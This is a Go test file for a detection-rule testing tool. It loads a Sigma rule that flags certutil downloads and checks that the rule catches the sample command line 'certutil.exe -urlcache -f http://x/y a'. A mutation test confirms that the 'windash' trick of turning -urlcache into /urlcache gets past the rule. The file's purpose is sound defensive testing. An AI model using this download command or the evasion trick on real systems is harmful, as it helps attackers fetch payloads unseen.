package runner

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/principlebreach/ordeal/internal/engine"
	"github.com/principlebreach/ordeal/internal/testcase"
)

const certutilRule = `title: Certutil Download
id: 11111111-1111-1111-1111-111111111111
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains: '-urlcache'
  condition: selection
`

const certutilSuite = `rule: rule.yml
cases:
  - name: fires on urlcache
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -urlcache -f http://x/y a'
    match: true
  - name: benign dump
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -dump'
    match: false
`

func writeSuite(t *testing.T) *testcase.Suite {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "rule.yml"), []byte(certutilRule), 0o644); err != nil {
		t.Fatal(err)
	}
	suitePath := filepath.Join(dir, "rule.test.yml")
	if err := os.WriteFile(suitePath, []byte(certutilSuite), 0o644); err != nil {
		t.Fatal(err)
	}
	s, err := testcase.Load(suitePath)
	if err != nil {
		t.Fatal(err)
	}
	return s
}

func TestRunTestsAllPass(t *testing.T) {
	s := writeSuite(t)
	rn := New(engine.NewNative())
	rep, err := rn.RunTests(context.Background(), []*testcase.Suite{s})
	if err != nil {
		t.Fatal(err)
	}
	if !rep.OK() {
		t.Fatalf("expected all pass, got %d failed", rep.Failed())
	}
	if rep.Passed() != 2 {
		t.Fatalf("expected 2 passed, got %d", rep.Passed())
	}
}

func TestRunMutationsFindsWindashEvasion(t *testing.T) {
	s := writeSuite(t)
	rn := New(engine.NewNative())
	rep, err := rn.RunMutations(context.Background(), []*testcase.Suite{s})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Rules) != 1 {
		t.Fatalf("expected 1 resilience result, got %d", len(rep.Rules))
	}
	res := rep.Rules[0]
	if !res.BaselineMatched {
		t.Fatal("baseline should have matched")
	}
	if len(res.Evaded) == 0 {
		t.Fatal("expected at least one evasion (windash /urlcache should slip past)")
	}
	// windash turning -urlcache into /urlcache must be among the evasions.
	var sawWindash bool
	for _, e := range res.Evaded {
		if e.Mutator == "windash" {
			sawWindash = true
		}
	}
	if !sawWindash {
		t.Errorf("expected windash evasion, got %+v", res.Evaded)
	}
	if rep.OK() {
		t.Error("report with evasions should not be OK")
	}
}

func TestScoreBounds(t *testing.T) {
	r := Resilience{Attempted: 10, Survived: 7}
	if got := r.Score(); got != 0.7 {
		t.Fatalf("expected 0.7, got %v", got)
	}
	empty := Resilience{}
	if got := empty.Score(); got != 1 {
		t.Fatalf("expected 1.0 for no attempts, got %v", got)
	}
}
